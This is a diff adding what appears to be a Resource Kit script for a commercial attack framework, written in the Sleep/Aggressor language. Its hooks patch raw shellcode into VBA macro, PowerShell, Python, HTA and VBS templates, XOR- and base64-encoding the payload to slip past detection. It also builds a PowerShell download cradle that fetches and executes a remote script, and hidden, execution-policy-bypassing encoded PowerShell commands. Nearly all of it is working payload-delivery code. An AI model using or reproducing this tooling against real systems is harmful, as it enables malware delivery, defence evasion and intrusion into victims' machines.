@@ -1,0 +1,203 @@
+################################################
+## Resource Kit
+
+print_info("Resource Kit Loaded");
+$resource_kit_path = iff($resource_kit_path eq "", script_resource(""), $resource_kit_path);
+
+# RESOURCE_GENERATOR HOOK
+#
+# Arguments
+#  $1 = the file
+#  $2 = x86 shellcode
+#  $3 = x64 shellcode
+#
+# Return
+#  our generated resource
+#
+set RESOURCE_GENERATOR {
+   print_info("Resource - RESOURCE_GENERATOR hook");
+
+   local('$script_path $handle $data, $template');
+
+   $script_path = getFileProper($resource_kit_path, $1);
+   # no resource? no problem.
+   if (!-exists $script_path) {
+      print_error("Resource - Script not found " . $script_path);
+      return $null;
+   }
+
+   # read in the resource 
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   # format our shellcode AND patch it into the resource
+   $template = $1;
+   if ($template eq "template.x86.vba") {
+      return strrep($data, '$PAYLOAD$', 'myArray = ' . transform($2, "vba"));
+   }
+   else if ($template eq "template.py") {
+      return strrep($data, '$$CODE32$$', transform($2, "veil"), '$$CODE64$$', transform($3, "veil"));
+   }
+   else if ($template eq "template.x86.ps1" && -hasbootstraphint $2) {
+      # we're going to use a different template in this circumstance.
+      $handle = openf(getFileProper($resource_kit_path, "template.hint.x86.ps1"));
+      $data   = readb($handle, -1);
+      closef($handle);
+
+      # calculate the locations of these hints.
+      local('$gmh_offset $gpa_offset');
+      $gmh_offset = payload_bootstrap_hint($2, "GetModuleHandleA");
+      $gpa_offset = payload_bootstrap_hint($2, "GetProcAddress");
+
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($2, chr(35)) ), '%%GPA_OFFSET%%', $gpa_offset, '%%GMH_OFFSET%%', $gmh_offset);
+   }
+   else if ($template eq "template.x64.ps1" && -hasbootstraphint $3) {
+      # we're going to use a different template in this circumstance.
+      $handle = openf(getFileProper($resource_kit_path, "template.hint.x64.ps1"));
+      $data   = readb($handle, -1);
+      closef($handle);
+
+      # calculate the locations of these hints.
+      local('$gmh_offset $gpa_offset');
+      $gmh_offset = payload_bootstrap_hint($3, "GetModuleHandleA");
+      $gpa_offset = payload_bootstrap_hint($3, "GetProcAddress");
+
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($3, chr(35)) ), '%%GPA_OFFSET%%', $gpa_offset, '%%GMH_OFFSET%%', $gmh_offset);
+   }
+   else if ($template eq "template.x86.ps1") {
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($2, chr(35)) ));
+   }
+   else if ($template eq "template.x64.ps1") {
+      return strrep($data, '%%DATA%%', base64_encode( str_xor($3, chr(35)) ));
+   }
+
+   # return null if we don't know about the resource (this allows some future-proofing)
+   print_error("Resource - Unable to patch in shellcode for template " . $template);
+   return $null;
+}
+
+# reduce the size of a PowerShell script.
+# $1 = the script to compress...
+set POWERSHELL_COMPRESS {
+   print_info("Resource - POWERSHELL_COMPRESS hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "compress.ps1");
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   # read in our compress template
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   # compress our script, base64 encode that, patch into compress.ps1
+   return strrep($data, '%%DATA%%', base64_encode(gzip($1)));
+}
+
+# PowerShell Download Cradle
+# $1 = URL to snag PowerShell script from. (often http://127.0.0.1:[port]/)
+set POWERSHELL_DOWNLOAD_CRADLE {
+   print_info("Resource - POWERSHELL_DOWNLOAD_CRADLE hook");
+   return "IEX (New-Object Net.Webclient).DownloadString(' $+ $1 $+ ')";
+}
+
+# Format our PowerShell Commands
+# $1 = the script we want to run, $2 = are we destined for a remote system? [true or false]
+set POWERSHELL_COMMAND {
+   print_info("Resource - POWERSHELL_COMMAND hook");
+
+   local('$script');
+   $script = transform($1, "powershell-base64");
+   
+   # remote command (e.g., psexec_psh, wmi, etc.)
+   if ($2) {
+      return "powershell -nop -w hidden -encodedcommand $script";
+   }
+   # local command
+   else {
+      return "powershell -nop -exec bypass -EncodedCommand $script";
+   }
+}
+
+# reduce the size of a Python script. (or not)
+# $1 = the script to compress...
+set PYTHON_COMPRESS {
+   print_info("Resource - PYTHON_COMPRESS hook");
+   return "import base64; exec base64.b64decode(\"" . base64_encode($1) . "\")";
+}
+
+# HTML Application (Executable) Template
+# $1 = the EXE data, $2 = name of the .exe
+set HTMLAPP_EXE {
+   print_info("Resource - HTMLAPP_EXE hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "template.exe.hta");
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   $data   = strrep($data, '##EXE##', transform($1, "hex"));
+   $data   = strrep($data, '##NAME##', $2);
+
+   return $data;
+}
+
+# HTML Application (PowerShell) Template
+# $1 = the command to run
+set HTMLAPP_POWERSHELL {
+   print_info("Resource - HTMLAPP_POWERSHELL hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "template.psh.hta");
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   # push our command into the script
+   return strrep($data, "%%DATA%%", $1);
+}
+
+# VBS Template
+# $1 = the macro to embed
+set RESOURCE_GENERATOR_VBS {
+   print_info("Resource - RESOURCE_GENERATOR_VBS hook");
+
+   local('$script_path $handle $data');
+
+   $script_path = getFileProper($resource_kit_path, "template.vbs");
+
+   if (!-isFile $script_path) {
+      print_error("Resource - Script not found " . $script_path );
+      return $null;
+   }
+
+   print_info("Resource - " . $script_path);
+   $handle = openf($script_path);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   return strrep($data, '$$CODE$$', transform_vbs($1, 8));
+}
+
